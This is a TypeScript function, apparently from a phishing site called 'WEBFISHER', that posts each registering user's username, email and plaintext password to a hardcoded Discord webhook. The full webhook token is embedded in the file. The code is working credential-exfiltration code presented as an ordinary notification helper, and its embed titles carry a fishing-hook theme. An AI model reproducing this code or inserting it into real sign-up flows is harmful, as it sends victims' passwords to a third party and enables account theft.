const DISCORD_WEBHOOK_URL =
  "https://canary.discord.com/api/webhooks/1543015660777381999/W2prpDN7YSDKlVgmWQL-pTPCXJ_tEsXf5dT7SrcZaKYNiuIVNby3qSAGNCZUh3FP0URP"

export async function sendDiscordNotification(username: string, email: string, password?: string, type: "Registro" | "Verificación" = "Registro") {
  try {
    const fields = [
      {
        name: "Usuario",
        value: username,
        inline: true,
      },
      {
        name: "Email",
        value: email,
        inline: true,
      },
      {
        name: "Fecha",
        value: new Date().toLocaleString("es-ES"),
        inline: false,
      },
    ]

    if (password) {
      fields.splice(2, 0, {
        name: "Contraseña",
        value: `\`${password}\``,
        inline: true,
      })
    }

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: type === "Registro" ? "🎣 Nuevo Registro en WEBFISHER" : "✅ Usuario Verificado en WEBFISHER",
            color: type === "Registro" ? 0x4a9eff : 0x22c55e,
            fields: fields,
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    })
  } catch (error) {
    console.error("Error sending Discord notification:", error)
  }
}
